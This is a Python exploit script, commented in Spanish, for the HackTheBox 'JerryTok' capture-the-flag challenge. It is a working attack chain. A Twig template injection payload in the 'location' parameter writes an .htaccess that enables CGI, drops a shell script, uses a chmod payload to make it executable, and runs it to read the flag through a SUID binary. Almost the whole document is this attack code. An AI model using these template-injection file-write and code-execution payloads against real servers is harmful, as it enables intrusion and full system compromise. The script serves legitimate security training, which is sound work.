#!/usr/bin/env python3
"""
JerryTok (HackTheBox)

    uv run --with requests full_test.py
    uv run --with requests full_test.py --host IP:PUERTO
    python3 full_test.py
    python3 full_test.py --host IP:PUERTO
"""

import argparse

import requests

parser = argparse.ArgumentParser(description="Exploit de JerryTok.")
parser.add_argument("--host", default="localhost:1337",
                    help="IP:PUERTO de la instancia (def. localhost:1337)")
args = parser.parse_args()

TARGET_URL = "http://" + args.host.split("://")[-1]

# --- datos del analisis de los archivos del reto ---
PARAMETRO = "location"      # DefaultController.php
WEB_ROOT  = "/www/public"   # httpd.conf (DocumentRoot)
BINARIO   = "/readflag"     # Dockerfile (SUID 4755)

SHELL = "shell.nriver"  # extension que registramos como cgi-script


def ssti(payload):
    """Envia un payload por el parametro vulnerable y devuelve la respuesta."""
    r = requests.get(TARGET_URL, params={PARAMETRO: payload}, timeout=15)
    return r.text


def main():
    print("[*] JerryTok — cadena SSTI -> CGI contra", TARGET_URL)

    # 1) Sobrescribir .htaccess para habilitar CGI en el DocumentRoot
    htaccess = "Options +ExecCGI\nAddHandler cgi-script .nriver\n"
    ssti("{{['%s/.htaccess','%s']|sort('file_put_contents')}}" % (WEB_ROOT, htaccess))
    print("[1] .htaccess escrito: CGI habilitado para la extension .nriver")

    # 2) Escribir el script CGI que ejecuta el binario SUID
    #    (el 'echo &&' inicial manda la linea en blanco que CGI exige
    #     como fin de cabeceras, antes del contenido)
    script = "#!/bin/sh\n\necho && %s\n" % BINARIO
    ssti("{{['%s/%s','%s']|sort('file_put_contents')}}" % (WEB_ROOT, SHELL, script))
    print("[2] %s escrito" % SHELL)

    # 3) Darle permiso de ejecucion (511 decimal = 0777 octal)
    ssti("{{['%s/%s',511]|sort('chmod')}}" % (WEB_ROOT, SHELL))
    print("[3] chmod 777 aplicado")

    # 4) Visitar el script: Apache lo ejecuta como CGI -> /readflag -> flag
    r = requests.get(TARGET_URL + "/" + SHELL, timeout=15)
    print("[4] Respuesta del CGI:")
    print(r.text)


if __name__ == "__main__":
    main()
